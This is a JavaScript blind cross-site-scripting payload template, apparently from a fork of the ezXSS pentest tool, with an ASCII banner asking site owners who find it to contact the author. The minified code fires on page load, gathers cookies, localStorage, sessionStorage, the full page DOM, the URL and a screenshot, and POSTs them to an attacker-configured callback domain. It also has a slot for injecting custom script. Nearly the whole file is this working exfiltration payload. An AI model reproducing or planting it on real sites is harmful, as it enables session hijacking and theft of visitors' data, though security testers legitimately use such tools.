/*
$$$$$$\ $$\      $$\ $$$$$$$\   $$$$$$\  $$$$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$\
\_$$  _|$$$\    $$$ |$$  __$$\ $$  __$$\ $$  __$$\\__$$  __|$$  __$$\ $$$\  $$ |\__$$  __|$$ |
  $$ |  $$$$\  $$$$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |  $$ |   $$ /  $$ |$$$$\ $$ |   $$ |   $$ |
  $$ |  $$\$$\$$ $$ |$$$$$$$  |$$ |  $$ |$$$$$$$  |  $$ |   $$$$$$$$ |$$ $$\$$ |   $$ |   $$ |
  $$ |  $$ \$$$  $$ |$$  ____/ $$ |  $$ |$$  __$$<   $$ |   $$  __$$ |$$ \$$$$ |   $$ |   \__|
  $$ |  $$ |\$  /$$ |$$ |      $$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |$$ |\$$$ |   $$ |
$$$$$$\ $$ | \_/ $$ |$$ |       $$$$$$  |$$ |  $$ |  $$ |   $$ |  $$ |$$ | \$$ |   $$ |   $$\
\______|\__|     \__|\__|       \______/ \__|  \__|  \__|   \__|  \__|\__|  \__|   \__|   \__|


$$$$$$$\  $$\                                               $$$$$$$\                            $$\
$$  __$$\ $$ |                                              $$  __$$\                           $$ |
$$ |  $$ |$$ | $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\        $$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$$ |
$$$$$$$  |$$ |$$  __$$\  \____$$\ $$  _____|$$  __$$\       $$$$$$$  |$$  __$$\  \____$$\ $$  __$$ |
$$  ____/ $$ |$$$$$$$$ | $$$$$$$ |\$$$$$$\  $$$$$$$$ |      $$  __$$< $$$$$$$$ | $$$$$$$ |$$ /  $$ |
$$ |      $$ |$$   ____|$$  __$$ | \____$$\ $$   ____|      $$ |  $$ |$$   ____|$$  __$$ |$$ |  $$ |
$$ |      $$ |\$$$$$$$\ \$$$$$$$ |$$$$$$$  |\$$$$$$$\       $$ |  $$ |\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |
\__|      \__| \_______| \_______|\_______/  \_______|      \__|  \__| \_______| \_______| \_______|

This is a script to test for Cross-site Scripting (XSS). It is used by a security professional.
If you have stumbled upon this inside your website please contact hello (at) glitchwitch.io
-GlitchWitch.io
*/
// Source code forked from
// ezXSS {{version}}
// github.com/ssl/ezXSS
// Find the fork at
// github.com/glitchwitchsec/ezXSS-docker

function ez_n(e){return void 0!==e?e:""}function ez_cb(e){var t=new XMLHttpRequest;t.open("POST","https://{{domain}}/callback",!0),t.setRequestHeader("Content-type","text/plain"),t.onreadystatechange=function(){4==t.readyState&&t.status},t.send(JSON.stringify(e))}function ez_hL(){try{ez_rD.uri=ez_n(location.toString())}catch(e){ez_rD.uri=""}try{ez_rD.cookies=ez_n(document.cookie)}catch(e){ez_rD.cookies=""}try{ez_rD.referrer=ez_n(document.referrer)}catch(e){ez_rD.referrer=""}try{ez_rD["user-agent"]=ez_n(navigator.userAgent)}catch(e){ez_rD["user-agent"]=""}try{ez_rD.origin=ez_n(location.origin)}catch(e){ez_rD.origin=""}try{ez_rD.localstorage=window.localStorage;}catch(e){ez_rD.localstorage="";}try{ez_rD.sessionstorage=window.sessionStorage;}catch(e){ez_rD.sessionstorage="";}try{ez_rD.dom=ez_n(document.documentElement.outerHTML)}catch(e){ez_rD.dom=""}try{html2canvas(document.body).then(function(e){ez_rD.screenshot=ez_n(e.toDataURL()),ez_c();});}catch(e){ez_rD.screenshot="",ez_c()}function ez_c(){ez_r(),ez_cb(ez_rD)}}function ez_aE(e,t,n){e.addEventListener?e.addEventListener(t,n,!1):e.attachEvent&&e.attachEvent("on"+t,n)}ez_rD={},"complete"==document.readyState?ez_hL():ez_aE(window,"load",function(){ez_hL()});

{{screenshot}}

function ez_r() {
  {{customjs}}
}
